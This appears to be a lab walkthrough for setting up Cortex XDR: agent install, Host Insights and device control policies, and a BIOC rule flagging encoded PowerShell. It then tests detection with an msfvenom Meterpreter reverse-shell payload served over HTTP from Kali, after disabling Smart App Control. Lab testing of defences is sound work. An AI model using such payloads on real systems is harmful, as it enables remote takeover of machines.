# Agent Deployment
## Generating the Installation Package
* Log into the management console
* Navigate to Inventory > Installations
* Select Create in the top right corner and configure the package with your Lab name, platform, and choose version `9.1.0.20483` (or latest stable)
* Click Create to generate the installer

# Configuring XDR Host Insights
1. Create the Host Insights Profile
* Navigate to Inventory > Policy Management > Prevention > Profiles
* Click Add Profile and select your OS
* Select Agent Settings
* Configure the profile with XDR Pro Endpoints Capabilities `Enabled`
* Create

2. Assign the Policy
* Go to Prevention > Policy Rules
* Click Add Policy and create it with your `Agent Settings`
* Click Next and select the target endpoint
* Click Next and then Done to apply the policy

# Device Control & BIOC Rules
1. Device Control: Blocking Legacy Media
* Navigate to Inventory > Policy Management > Extensions > Profiles
* Click Add Profile 
* Select Device Configuration
* Name: `Block Floppy`
* Enable the Block Floppy Disk option
* Create and apply this to the endpoint via Prevention > Policy Rules (following the same steps as the Host Insights policy)

2. Custom BIOC Rule: PowerShell Obfuscation Detection
* Navigate to Threat Management > Detection Rules > BIOC
* Click Add BIOC and select Process
* Configure the rule logic: Name: `Possible Powershell Execution - CC`, CMD: `contains ‘-enc’`
* Click Save and define the metadata: Type: `Execution`, Severity: `Low`, MITRE Technique: `T1059 - Command and Scripting Interpreter`
* Click OK

# Kali Attack
## 1. Payload Generation
1. Deploy a Kali Linux VM
2. Open a terminal
3. Generate a 64-bit Windows Meterpreter payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your Kali IP address> LPORT=80 -f exe -o shell1.exe`
4. In the same terminal start the server: `python3 -m http.server 80`
5. Navigate to the ip in the browser of your local machine
6. Download the file to the target machine
7. Attempt to run the executable
8. The agent should immediately identify the file as malicious based on its behavioral characteristics (WildFire or local analysis) and terminate the process before the reverse connection can be established. I had to disable microsoft Smart App Controls.

## 2. Verification in Cortex XDR Console
1. Navigate to the Cortex XDR Console
2. Go to Incident Management > Incidents
3. Locate the alert associated with the Windows host
